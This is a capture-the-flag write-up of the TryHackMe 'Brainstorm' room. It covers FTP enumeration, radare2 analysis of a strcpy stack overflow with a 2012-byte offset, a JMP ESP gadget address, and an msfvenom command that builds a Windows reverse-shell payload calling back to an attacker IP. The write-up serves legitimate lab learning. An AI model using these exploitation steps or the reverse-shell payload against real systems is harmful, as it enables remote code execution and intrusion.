
# TryHackMe - Brainstorm

## Overview

- **Room:** Brainstorm
- **Platform:** TryHackMe
- **Difficulty:** Medium
- **Focus:** Network reconnaissance, anonymous FTP access, Windows binary analysis, stack-based buffer overflow exploitation, JMP ESP gadget identification, shellcode generation, and remote code execution.

---

## Attack Path

The compromise followed this chain:

```text
Nmap port scanning and service enumeration
        ↓
Anonymous FTP access
        ↓
Download of chatserver.exe and essfunc.dll
        ↓
Static analysis of the vulnerable _Overflow function
        ↓
Identification of the buffer overflow offset
        ↓
JMP ESP gadget discovery in essfunc.dll
        ↓
Generation of a Windows x86 reverse shell payload
        ↓
Construction and execution of the buffer overflow exploit
        ↓
Reverse shell on the target machine
        ↓
Retrieval of root.txt
```

---

# 1. Reconnaissance and Port Scanning

I began by performing an Nmap service and version detection scan against the target machine.

```bash
nmap -sV -p- <TARGET_IP>
```

The initial scan indicated that the host was unavailable. Nmap suggested that the target might be blocking its discovery probes.

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-16 11:21 UTC
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.58 seconds
```

Since the target could be filtering ICMP or other host discovery probes, I repeated the scan using `-Pn` to skip host discovery and scan the target directly.

```bash
nmap -Pn -p- <TARGET_IP>
```

The scan identified three open TCP ports:

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-16 11:22 UTC
Nmap scan report for ip-10-49-146-212.ap-south-1.compute.internal (10.49.146.212)
Host is up (0.00044s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
3389/tcp open  ms-wbt-server
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 104.38 seconds
```

The exposed services were:

| Port | Service | Purpose |
|---|---|---|
| 21 | FTP | File transfer service |
| 3389 | MS-WBT-Server | Remote Desktop Protocol |
| 9999 | Abyss | Custom chat server application |

Port `9999` was particularly interesting because it exposed a custom chat server. I decided to investigate the FTP service for application files that could help identify vulnerabilities in the chat server.

---

# 2. Anonymous FTP Access and Binary Acquisition

With FTP exposed on port 21, I attempted to authenticate using anonymous credentials.

```bash
ftp <TARGET_IP>
```

The server accepted anonymous access:

```text
Connected to 10.49.146.212.
220 Microsoft FTP Service
Name (10.49.146.212:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

After authenticating, I attempted to enumerate the available files. The initial directory listing encountered a data connection issue, so I switched the FTP connection to active mode and retried.

```text
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> bin
200 Type set to I.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-29-19  07:36PM        <DIR>          chatserver
226 Transfer complete.
```

The FTP server contained a directory named `chatserver`.

I entered the directory and listed its contents:

```text
ftp> cd chatserver
250 CWD command successful.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-29-19  09:26PM             43747 chatserver.exe
08-29-19  09:27PM             30761 essfunc.dll
226 Transfer complete.
```

Two files were available:

- `chatserver.exe` — the custom chat server executable.
- `essfunc.dll` — a supporting DLL that could contain useful executable instructions.

I downloaded both files for local analysis:

```text
ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |**************************************************| 43747      292.84 KiB/s    00:00 ETA
226 Transfer complete.
43747 bytes received in 00:00 (292.55 KiB/s)

ftp> get essfunc.dll
local: essfunc.dll remote: essfunc.dll
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |**************************************************| 30761       33.45 MiB/s    00:00 ETA
226 Transfer complete.
30761 bytes received in 00:00 (28.23 KiB/s)
```

I now had both binaries available locally for static analysis.

### Finding

**Anonymous FTP Access Exposed Application Binaries**

The FTP service allowed unauthenticated access through anonymous login. This exposed the chat server executable and its supporting DLL, providing the files needed to investigate the application for vulnerabilities.

---

# 3. Static Binary Analysis Using radare2

I used radare2 to inspect `chatserver.exe` and identify functions that handled incoming user input.

I opened the executable:

```bash
r2 chatserver.exe
```

I performed automated analysis:

```text
[0x004014e0]> aaa
```

The `aaa` command performs analysis of the executable, including functions, references, and call relationships.

I then listed the discovered functions:

```text
[0x004014e0]> afl
0x004014e0    1 26           entry0
...
0x00401560    1 32           sym._Overflow
0x00402e88    1 6            sym._strcpy
...
```

A function named `_Overflow` stood out as a potential vulnerability.

## Inspecting the _Overflow Function

I navigated to the function and disassembled it:

```text
[0x004014e0]> s sym._Overflow
[0x00401560]> pdf
```

The relevant disassembly was:

```text
; CALL XREF from sym._ConnectionHandler_4 @ 0x401b9a
/ (32) sym._Overflow (void *arg_8h);
|           ; var char *dest @ ebp-0x7d8
|           ; arg void *arg_8h @ ebp+0x8
|           ; var char *src @ esp+0x4
|           0x00401560      55             push ebp
|           0x00401561      89e5           mov ebp, esp
|           0x00401563      81ece8070000   sub esp, 0x7e8
|           0x00401569      8b4508         mov eax, dword [arg_8h]
|           0x0040156c      89442404       mov dword [src], eax
|           0x00401570      8d8528f8ffff   lea eax, [dest]
|           0x00401576      890424         mov dword [esp], eax
|           0x00401579      e80a190000     call sym._strcpy
|           0x0040157e      c9             leave
|           0x0040157f      c3             ret
```

The function passes user-controlled input to `strcpy()` without performing a bounds check.

The relevant instruction is:

```text
0x00401579      call sym._strcpy
```

The destination buffer is allocated on the stack, and `strcpy()` copies the supplied input into it without checking whether the input exceeds the buffer's capacity.

This creates a stack-based buffer overflow.

## Calculating the Buffer Overflow Offset

The analysis identified a buffer size of:

```text
0x7d8 = 2008 bytes
```

Adding the four bytes occupied by the saved EBP gave the offset required to reach the saved return address:

```text
2008 + 4 = 2012 bytes
```

Therefore, the calculated offset to overwrite the saved return address was **2012 bytes**.

### Finding

**Unbounded strcpy() in the _Overflow Function**

The `_Overflow` function copied user-controlled input into a stack buffer using `strcpy()` without validating the input length.

This allowed an attacker to overwrite adjacent stack data, including the saved return address, creating an opportunity to redirect program execution.

### Vulnerability

**Stack-Based Buffer Overflow**

Static analysis with radare2 identified the vulnerable `strcpy()` call inside `_Overflow`. The calculated offset to the saved return address was 2012 bytes.

Successful exploitation could allow control-flow hijacking and arbitrary code execution within the security context of the vulnerable application.

---

# 4. Locating a JMP ESP Gadget

After identifying the buffer overflow offset, I needed an instruction that would allow execution to continue into the shellcode placed on the stack.

I searched `essfunc.dll` for the opcode `FFE4`, which corresponds to the x86 `JMP ESP` instruction.

I opened the DLL in radare2:

```bash
r2 essfunc.dll
```

I searched for the opcode:

```text
[0x62501420]> /x ffe4
```

The search returned several matches:

```text
Searching 2 bytes in [0x6250a400-0x6250b000]
hits: 0
...
Searching 2 bytes in [0x62501000-0x62502600]
hits: 9
0x625014df hit0_0 ffe4
0x625014eb hit0_1 ffe4
0x625014f7 hit0_2 ffe4
0x62501503 hit0_3 ffe4
0x6250150f hit0_4 ffe4
0x6250151b hit0_5 ffe4
0x62501527 hit0_6 ffe4
0x62501533 hit0_7 ffe4
0x62501535 hit0_8 ffe4
```

I selected the following gadget address:

```text
0x625014df
```

The `JMP ESP` instruction allows execution to jump to the address currently held in the ESP register. In a buffer overflow exploit, this can redirect execution to shellcode positioned on the stack.

### Finding

**JMP ESP Gadget in essfunc.dll**

The supporting DLL contained multiple instances of the `JMP ESP` opcode. The selected address was `0x625014df`.

This provided a potential redirection point for execution after overwriting the saved return address.

---

# 5. Windows Reverse Shell Payload Generation

With the buffer overflow offset and selected gadget address identified, I generated a Windows reverse shell payload using msfvenom.

The target application was a 32-bit Windows executable, so I used an x86 Windows reverse shell payload.

I initially generated the payload using an incorrect attacking machine IP address:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.49.12.215 LPORT=4444 -b "\x00" -f python -v shellcode
```

The output showed that the payload had been encoded successfully:

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
Payload size: 351 bytes
```

I then corrected the attacking machine IP address to the active AttackBox VPN IP:

```text
10.49.122.215
```

I regenerated the payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.49.122.215 LPORT=4444 -b "\x00" -f python -v shellcode
```

The corrected generation completed successfully:

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
Payload size: 351 bytes
Final size of python file: 1965 bytes
```

The generated payload used the `x86/shikata_ga_nai` encoder and excluded null bytes using:

```text
-b "\x00"
```

The payload was generated in Python format so it could be incorporated into the exploit script.

---

# 6. Troubleshooting Target Connectivity

During testing, the TryHackMe target environment expired or required redeployment. This caused the target IP address to become unavailable.

I first tested connectivity to the chat server on port `9999`:

```bash
nc -nv 10.49.146.212 9999
```

The connection timed out:

```text
nc: connect to 10.49.146.212 port 9999 (tcp) failed: Connection timed out
```

I then attempted to ping the target:

```bash
ping -c 4 10.49.146.212
```

The result showed complete packet loss:

```text
PING 10.49.146.212 (10.49.146.212) 56(84) bytes of data.

--- 10.49.146.212 ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3107ms
```

I also attempted Nmap host discovery:

```bash
nmap -sC 10.49.146.212
```

The result was:

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-16 11:51 UTC
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.39 seconds
```

These results indicated that the original target address was no longer reachable.

After redeploying the target, its IP address changed to:

```text
10.49.153.169
```

I updated the exploit script to use the new target IP before continuing.

---

# 7. Buffer Overflow Exploitation and Flag Retrieval

After updating the exploit script with the new target IP, I executed it against the chat server on port `9999`.

```bash
python3 exploit.py
```

The exploit successfully connected to the target and interacted with the chat server:

```text
[+] Connecting to 10.49.153.169:9999...
[+] Opening connection to 10.49.153.169 on port 9999: Done
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters):
 Write a message:
[+] Exploit payload sent successfully!
[*] Closed connection to 10.49.153.169 port 9999
```

The exploit delivered the buffer overflow payload to the vulnerable chat server.

## Reverse Shell and Flag Retrieval

The reverse shell connection was received through the Netcat listener.

From the resulting Windows shell, I navigated to the user's Desktop directory and retrieved the root flag:

```cmd
C:\Users\drake\Desktop>type root.txt
```

The command returned the root flag.

> **Final Result: Root Flag Obtained**

The buffer overflow exploit successfully provided remote code execution on the Windows target, allowing retrieval of `root.txt` from the Desktop directory.

---

# Attack Chain Summary

The complete attack path I followed to compromise the Brainstorm machine was:

```text
Nmap port scanning
        ↓
-Pn bypass of blocked host discovery probes
        ↓
Anonymous FTP authentication
        ↓
Download chatserver.exe and essfunc.dll
        ↓
radare2 static binary analysis
        ↓
Identification of unbounded strcpy() in _Overflow
        ↓
Calculation of 2012-byte return address offset
        ↓
JMP ESP gadget discovery in essfunc.dll
        ↓
Windows x86 reverse shell generation with msfvenom
        ↓
Target redeployment and IP address update
        ↓
Execution of exploit.py against port 9999
        ↓
Windows reverse shell
        ↓
Retrieval of root.txt
```

---

# Key Vulnerabilities

| Vulnerability | Impact |
|---|---|
| Anonymous FTP access | Allowed unauthenticated users to download the chat server executable and supporting DLL. |
| Stack-based buffer overflow in `_Overflow` | Unbounded `strcpy()` input handling allowed overwriting the saved return address and redirecting execution. |
| Insufficient input validation | Allowed oversized input to reach the vulnerable function and corrupt stack memory. |

---

# Lessons Learned

This room demonstrated the importance of combining network reconnaissance with application-level analysis. Nmap identified the exposed FTP and custom chat server services, while anonymous FTP access provided the binaries needed to investigate the application locally. Static analysis with radare2 then exposed the vulnerable `strcpy()` call, allowing the buffer size and return address offset to be calculated.

The exploitation process also reinforced several important concepts in Windows binary exploitation. Identifying a suitable `JMP ESP` gadget provided a way to redirect execution to stack-based shellcode, while msfvenom generated an x86 reverse shell payload that avoided null bytes. Finally, troubleshooting the target's changing IP address highlighted the importance of verifying connectivity and updating exploit configuration when working with temporary lab environments.
